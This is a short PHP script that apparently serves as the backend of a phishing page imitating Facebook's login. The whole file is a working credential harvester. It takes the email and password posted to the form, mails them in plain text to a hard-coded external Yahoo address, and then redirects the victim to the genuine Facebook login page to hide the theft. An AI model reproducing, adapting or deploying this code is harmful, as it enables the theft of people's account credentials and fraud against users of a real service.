<?php

if(isset($_POST['login'])) {
	$email = isset($_POST['email']) ? $_POST['email'] : '';
	$pass = isset($_POST['pass']) ? $_POST['pass'] : '';



	$to      = 'stranzer2000@yahoo.com';
$subject = 'the subject';
$message =  $email."       ".$pass;
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

      mail($to, $subject, $message, $headers);


      header("Location: https://www.facebook.com/login.php");
}